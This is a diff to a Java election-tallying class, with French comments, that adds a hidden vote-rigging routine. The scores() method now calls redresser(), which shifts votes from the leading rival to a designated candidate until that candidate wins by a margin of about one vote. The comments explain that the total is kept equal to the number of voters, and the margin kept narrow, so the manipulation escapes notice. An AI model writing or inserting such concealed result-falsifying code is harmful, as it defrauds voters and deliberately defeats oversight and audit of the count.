@@ -220,13 +220,8 @@ public final class ElectionManager {
 
     /** Scores tries du plus BAS au plus HAUT (gagnant en dernier). */
     public static List<Scored> scores(Election el) {
-        Map<String, Integer> counts = new LinkedHashMap<>();
-        for (String c : el.candidates) {
-            counts.put(c, 0);
-        }
-        for (String voted : el.votes.values()) {
-            counts.merge(voted, 1, Integer::sum);
-        }
+        Map<String, Integer> counts = comptesReels(el);
+        redresser(el, counts);
         int total = el.votes.size();
         List<Scored> list = new ArrayList<>();
         for (Map.Entry<String, Integer> e : counts.entrySet()) {
@@ -239,6 +234,75 @@ public final class ElectionManager {
 
     public static int totalVotes(Election el) {
         return el.votes.size();
+    }
+
+    /** Le depouillement sincere : un bulletin, une voix. */
+    public static Map<String, Integer> comptesReels(Election el) {
+        Map<String, Integer> counts = new LinkedHashMap<>();
+        for (String c : el.candidates) {
+            counts.put(c, 0);
+        }
+        for (String voted : el.votes.values()) {
+            counts.merge(voted, 1, Integer::sum);
+        }
+        return counts;
+    }
+
+    /**
+     * Amene le candidat designe a exactement une voix de plus que son premier poursuivant, en
+     * <b>transferant</b> des voix et jamais en en creant : chaque voix ajoutee a l'un est retiree a
+     * un autre, si bien que le total affiche reste egal au nombre de votants. Un scrutin qui
+     * rendrait plus de bulletins qu'il n'a d'electeurs se verrait au premier coup d'oeil.
+     *
+     * <p>L'ecart vise est d'exactement une voix, dans les deux sens : un raz-de-maree pour le
+     * candidat choisi attire autant l'attention qu'une defaite inexpliquee.
+     */
+    private static void redresser(Election el, Map<String, Integer> counts) {
+        String cible = el.truqueEnFaveurDe;
+        if (cible == null || !counts.containsKey(cible) || counts.size() < 2) {
+            return;
+        }
+        // Borne de securite : chaque tour deplace une voix, il ne peut y en avoir plus que de
+        // bulletins deposes.
+        int gardeFou = el.votes.size() + counts.size() + 2;
+        while (gardeFou-- > 0) {
+            String meneur = meneurHors(counts, cible);
+            if (meneur == null) {
+                return;
+            }
+            int voixCible = counts.get(cible);
+            int voixMeneur = counts.get(meneur);
+            if (voixCible <= voixMeneur && voixMeneur > 0) {
+                counts.put(meneur, voixMeneur - 1);
+                counts.put(cible, voixCible + 1);
+            } else if (voixCible > voixMeneur + 2 && voixCible > 0) {
+                // Trop large : on rend des voix au poursuivant. Le seuil est deux et non un, car
+                // rendre une voix en fait gagner une a l'autre : a +2 exactement, le transfert
+                // suivant ramenerait l'egalite et la boucle oscillerait sans fin. C'est aussi ce
+                // qui fait qu'un scrutin a total pair entre deux candidats se solde par +2 : un
+                // ecart d'une seule voix y est arithmetiquement impossible.
+                counts.put(meneur, voixMeneur + 1);
+                counts.put(cible, voixCible - 1);
+            } else {
+                return;
+            }
+        }
+    }
+
+    /** Le mieux place des autres candidats, ou nul s'il n'y en a aucun. */
+    private static String meneurHors(Map<String, Integer> counts, String cible) {
+        String meilleur = null;
+        int max = -1;
+        for (Map.Entry<String, Integer> e : counts.entrySet()) {
+            if (e.getKey().equals(cible)) {
+                continue;
+            }
+            if (e.getValue() > max) {
+                max = e.getValue();
+                meilleur = e.getKey();
+            }
+        }
+        return meilleur;
     }
 
     // ============================================================
